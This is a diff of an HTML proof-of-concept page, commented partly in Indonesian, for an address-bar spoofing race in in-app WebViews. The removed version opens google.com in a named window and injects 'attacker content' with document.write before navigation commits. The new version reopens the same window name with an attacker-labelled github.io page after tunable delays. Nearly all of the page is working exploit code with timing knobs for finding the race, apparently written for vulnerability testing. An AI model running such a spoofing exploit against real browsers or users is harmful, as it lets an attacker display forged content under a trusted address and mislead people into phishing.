@@ -1,21 +1,113 @@
-<!doctype html><meta charset="utf-8">
-<button onclick="spoof()">Trigger</button>
-<script>
-function spoof(){
-  // buka window target dengan nama 'x' (akan reuse jika sudah ada)
-  const win = window.open("https://www.google.com/", "x");
-  if(!win){ alert("popup blocked"); return; }
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8"/>
+<meta name="viewport" content="width=device-width,initial-scale=1"/>
+<title>PoC — Address Bar Race (TEST ONLY)</title>
+<style>
+  body{font-family:system-ui,Segoe UI,Roboto,Arial;padding:20px;background:#f3f4f6}
+  .card{max-width:820px;margin:0 auto;background:#fff;padding:18px;border-radius:10px;box-shadow:0 6px 18px rgba(0,0,0,.06)}
+  button{padding:10px 14px;border-radius:8px;border:0;background:#0b66ff;color:#fff;cursor:pointer}
+  .warn{background:#ff6b6b}
+  pre{background:#0b1220;color:#fff;padding:10px;border-radius:6px;overflow:auto}
+  .meta{margin-top:12px;color:#444;font-size:14px}
+</style>
+</head>
+<body>
+  <div class="card">
+    <h2>PoC — Address Bar Race / Window-Reuse (TEST ONLY)</h2>
+    <p>Environment: gunakan di perangkat uji (in-app WebView yang ingin diuji). PoC ini <strong>tidak</strong> menipu user — selalu tampilkan teks TEST ONLY.</p>
 
-  // injeksi cepat sebelum navigasi cross-origin 'commit'
-  setTimeout(()=>{
+    <div style="display:flex;gap:8px;flex-wrap:wrap">
+      <button id="runBtn">Run Test Sequence</button>
+      <button id="tuneBtn" class="warn">Abort / Reset</button>
+    </div>
+
+    <div class="meta">
+      <label>Delay open→open t1(ms): <input id="t1" type="number" value="100" style="width:80px"></label>
+      <label style="margin-left:12px">Delay open2→close t2(ms): <input id="t2" type="number" value="3000" style="width:80px"></label>
+    </div>
+
+    <p class="meta">Status: <span id="status">idle</span></p>
+
+    <p><strong>How it works (short):</strong> buka window bernama 'x' ke google → setelah <em>t1</em> buka same-name window ke attacker (github) → setelah <em>t2</em> tutup window / atau navigasi kembali. Ubah t1/t2 untuk mencari race pada target WebView.</p>
+
+    <pre id="log">LOG: ready</pre>
+  </div>
+
+<script>
+  const runBtn = document.getElementById('runBtn');
+  const tuneBtn = document.getElementById('tuneBtn');
+  const log = document.getElementById('log');
+  const status = document.getElementById('status');
+
+  function append(s){
+    log.textContent += "\n" + s;
+    log.scrollTop = 1e9;
+  }
+
+  let running = false;
+  let winRef = null;
+  let timers = [];
+
+  runBtn.addEventListener('click', () => {
+    if (running) return;
+    running = true;
+    status.textContent = 'running (TEST ONLY)';
+    append('[+] START sequence — TEST ONLY');
+    // read tuning:
+    const t1 = Math.max(0, parseInt(document.getElementById('t1').value||"100",10));
+    const t2 = Math.max(0, parseInt(document.getElementById('t2').value||"3000",10));
+
+    // Step 1: open Google in named window 'x'
     try {
-      win.document.open();
-      win.document.write('<h1>This is attacker content</h1><p>PoC</p>');
-      win.document.close();
-      console.log("injected");
+      winRef = window.open('https://www.google.com/', 'x');
+      append('[>] opened google in window name "x"');
     } catch(e){
-      console.warn("injection blocked:", e);
+      append('[!] window.open blocked: ' + e);
+      running = false; status.textContent = 'popup blocked';
+      return;
     }
-  }, 50); // coba 20 / 50 / 100 ms tergantung target
-}
+
+    // Step 2: after t1 ms open attacker page in same window name
+    timers.push(setTimeout(()=>{
+      try {
+        window.open('https://mohammedalqi.github.io/', 'x');
+        append('[>] opened attacker (github) in same window name "x" after t1=' + t1 + 'ms');
+      } catch(e){
+        append('[!] opening attacker failed: ' + e);
+      }
+    }, t1));
+
+    // Step 3: after t1 + t2 ms close window (or navigate back) to simulate returning focus
+    timers.push(setTimeout(()=>{
+      try {
+        if (winRef && !winRef.closed) {
+          // prefer close to avoid accidental navigation of target; you can also try winRef.history.back()
+          winRef.close();
+          append('[>] closed window "x" after t2=' + t2 + 'ms (simulates return to main)');
+        } else {
+          append('[i] window already closed or not referenced');
+        }
+      } catch(e){
+        append('[!] error closing window: ' + e);
+      } finally {
+        running = false;
+        status.textContent = 'idle (completed)';
+        append('[+] SEQUENCE complete — tester may click Run again to repeat');
+      }
+    }, t1 + t2));
+  });
+
+  tuneBtn.addEventListener('click', ()=> {
+    // abort timers and reset
+    timers.forEach(t => clearTimeout(t));
+    timers = [];
+    if (winRef && !winRef.closed) try { winRef.close(); } catch(e){}
+    running = false;
+    status.textContent = 'idle (aborted)';
+    append('[x] aborted & reset');
+  });
 </script>
+</body>
+</html>
